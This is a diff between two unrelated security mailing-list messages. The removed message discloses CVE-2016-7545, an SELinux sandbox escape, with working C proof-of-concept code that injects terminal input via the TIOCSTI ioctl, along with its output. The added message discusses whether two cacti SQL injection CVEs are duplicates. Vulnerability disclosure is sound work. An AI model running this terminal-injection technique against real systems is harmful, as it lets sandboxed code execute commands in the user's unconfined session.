@@ -1,50 +1,37 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/25/1
-Message-ID: <20160925134911.18991732ntfvg5a8@webmail.alunos.dcc.fc.up.pt>
-Date: Sun, 25 Sep 2016 13:49:11 +0200
-From: up201407890@...nos.dcc.fc.up.pt
-To: oss-security@...ts.openwall.com
-Subject: CVE-2016-7545 -- SELinux sandbox escape
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/01/05/6
+Message-ID: <20160105111246.GA4592@eldamar.local>
+Date: Tue, 5 Jan 2016 12:12:46 +0100
+From: Salvatore Bonaccorso <carnil@...ian.org>
+To: Andreas Stieger <astieger@...e.com>
+Cc: oss-security@...ts.openwall.com, cve-assign@...re.org, elbrus@...ian.org
+Subject: Re: Re: CVE Request: cacti: SQL injection vulnerability in graphs_new.php
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+Hi Andreas,
 
-When executing a program via the SELinux sandbox, the nonpriv session
-can escape to the parent session by using the TIOCSTI ioctl to push
-characters into the terminal's input buffer, allowing an attacker to
-escape the sandbox.
+On Tue, Jan 05, 2016 at 10:20:23AM +0100, Andreas Stieger wrote:
+> Hello,
+> 
+> On 01/05/2016 12:58 AM, cve-assign@...re.org wrote:
+> > > Another SQL injection vulnerability via graphs_new.php in cacti was
+> > > found, reported to the bug http://bugs.cacti.net/view.php?id=2652
+> >
+> > http://bugs.cacti.net/view.php?id=2652 is CVE-2015-8604.
+> 
+> Check against a possible duplicate assignment with CVE-2015-8377?
+> 
+> http://seclists.org/fulldisclosure/2015/Dec/att-57/cacti_sqli%281%29.txt
+> 
+> https://bugzilla.redhat.com/show_bug.cgi?id=1291222
+> http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-8377
+> http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8377
 
-$ cat test.c
-#include <unistd.h>
-#include <sys/ioctl.h>
+Theree are two different vulnerabilities here, see second comment in
+http://bugs.cacti.net/view.php?id=2652 which describe both, the
+CVE-2015-8377 and the new assigned one (CVE-2015-8604).
 
-int main()
-{
-     char *cmd = "id\n";
-     while(*cmd)
-      ioctl(0, TIOCSTI, cmd++);
-     execlp("/bin/id", "id", NULL);
-}
+Does this helps?
 
-$ gcc test.c -o test
-$ /bin/sandbox ./test
-id
-uid=1000 gid=1000 groups=1000
-context=unconfined_u:unconfined_r:sandbox_t:s0:c47,c176
-$ id    <------ did not type this
-uid=1000(saken) gid=1000(saken) groups=1000(saken)
-context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
-
-Bug report:
-https://bugzilla.redhat.com/show_bug.cgi?id=1378577
-
-Upstream fix:
-https://marc.info/?l=selinux&m=147465160112766&w=2
-https://marc.info/?l=selinux&m=147466045909969&w=2
-https://github.com/SELinuxProject/selinux/commit/acca96a135a4d2a028ba9b636886af99c0915379
-
-Federico Bento.
-
-----------------------------------------------------------------
-This message was sent using IMP, the Internet Messaging Program.
-
+Regards,
+Salvatore
